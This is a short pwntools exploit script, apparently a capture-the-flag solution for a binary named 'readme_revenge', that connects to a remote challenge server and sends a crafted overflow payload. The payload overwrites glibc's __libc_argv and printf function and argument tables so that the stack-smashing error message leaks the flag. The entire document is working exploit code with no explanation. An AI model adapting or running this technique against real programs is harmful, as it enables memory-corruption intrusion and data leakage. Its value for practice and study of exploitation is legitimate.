from pwn import *

target = ELF('./readme_revenge')

# r = process('./readme_revenge')
r = remote('35.198.130.245', 1337)

payload = ''
payload += p64(target.symbols['flag'])
payload += '\x00' * 0x72 * 8
payload += p64(target.symbols['__stack_chk_fail'])
payload += '\x00' * (target.symbols['__libc_argv'] - target.symbols['name'] - 0x74 * 8)
payload += p64(target.symbols['name'])
payload += '\x00' * (target.symbols['__printf_function_table'] - target.symbols['__libc_argv'] - 8)
payload += p64(1)
payload += '\x00' * (target.symbols['__printf_arginfo_table'] - target.symbols['__printf_function_table'] - 8)
payload += p64(target.symbols['name'])

r.sendline(payload)

r.recvuntil('*** stack smashing detected ***: ')
print r.recvuntil(' terminated')[:-11]
